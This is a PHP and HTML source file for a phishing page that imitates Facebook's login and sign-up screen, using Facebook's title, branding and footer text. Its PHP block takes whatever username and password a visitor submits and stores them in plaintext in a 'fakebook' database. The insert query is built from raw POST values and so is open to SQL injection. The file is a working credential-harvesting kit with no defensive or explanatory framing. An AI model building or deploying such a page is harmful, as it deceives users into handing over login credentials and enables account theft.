<?php
if(isset($_POST['submit1'])){
    $username = $_POST['username'];
    $password = $_POST['password'];
    

    $connection = mysqli_connect("localhost","root","","fakebook");
   /* if($connection){
        echo "<h3>connected<h3>";
    }else{
        die("<p>Not connected</p>");
    }*/

   $query  = "INSERT INTO `details` (`username`, `password`) VALUES ('$username', '$password')";
    $result = mysqli_query($connection,$query);
    if($result){
       echo "Done";
    }/*else{
        die("insertion failed".mysqli_error());
    }*/
}


?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>facebook.com</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="nav">

            <section class="containern">
                    <div class="left-halfn">
                     
                            <h1 id="main">facebook</h1>
                        
                    
                    </div>
                    <div class="right-halfn">
                      
                            <div class="login">
                                    
                                    <section class="containerm">
                                        <form action="index.php" method="post">
                                            <div class="left-halfm">
                                             <label for="Email id">Email id</label><br>
                                             <input type="Email" id="username" name="username">
                                            </div>
                                            <div class="right-halfm">
                                                <label for="password">password</label><br> 
                                                <input type="password" id="password" name="password"> 
                                                          
                                                <input type="submit"value="login" id="btn" name="submit1"><br>
                                                          <a href="#"id="Forgot">Forgotten account ?</a>
                                                                    </div>
                                                                </div>
                                                        
                                                              </section>
                                            
                                            </div>
                                        </form>
                                          </section>
                                </div>
                        
                     
                    </div>
                  </section>


</div>
    
    </div>
    <section class="container">
            <div class="left-half">
    
                <h2 id="prephot">Facebook helps you connect and share with the<br> people in your life.</h2>
                <img src="fb.png" alt="" id="img">
              
            </div>
            <div class="right-half">
        
                <h1 id="head">Create an account</h1>
                <h2 id="h21">It's quick and easy.</h2>
                <form action="">
                    <input type="text" placeholder="First name" id="su" required> <input type="text" placeholder="Surname" id="su" required><br>
                    <input type="email" placeholder="Email Id or Phone Number" id="sue" required><br>
                    <input type="password" placeholder="New Password" id="sue" required><br>
                    <label for="Birthday" id="bd" id="su" >Birthday</label><br>
                    <input type="date" value="1996-02-07" id="su" required><br>
                    <label for="Gender" id ="bd">Gende</label><br>
                    <ul>
                        <li>  <input type="radio" name="gender" value="male"> Male<br></li>
                        <li> <input type="radio" name="gender" value="female"> Female<br></li>
                        <li>  <input type="radio" name="gender" value="other"> Other<br> </li>
                    </ul><br>
                    <br>
                        <p>By clicking Sign Up, you agree to our Terms, Data Policy and Cookie Policy. You may receive SMS notifications from us and can opt out at any time</p><br>

                        <input type="submit"name="submit" value="Sign Up" id="btns"><br>

                        <h4> <a href="#">Create a page</a> for a celebrity, band or business. </h4>



                </form>
            
            </div>
        </section>
        <div class="footer">
<a href="#" id="lang">English (UK)
        অসমীয়া,
        বাংলা,
        हिन्दी,
        नेपाली,
        اردو,
        Español,
        Português (Brasil),
        Français (France),
        Deutsch,
        Italiano,
        </a>
        <hr>
        <a href="#" id="dn">
        Sign UpLog   Lite Watch People Pages Page categories Places Games Locations Marketplace Groups Instagram Local Fund raiser sService sAbout Create adCreate Page Developers Careers Privac yCookies AdChoice sTerm sHelp Settings Activity log<br>
Facebook © 2019</a>
        </div>
</body>
</html>
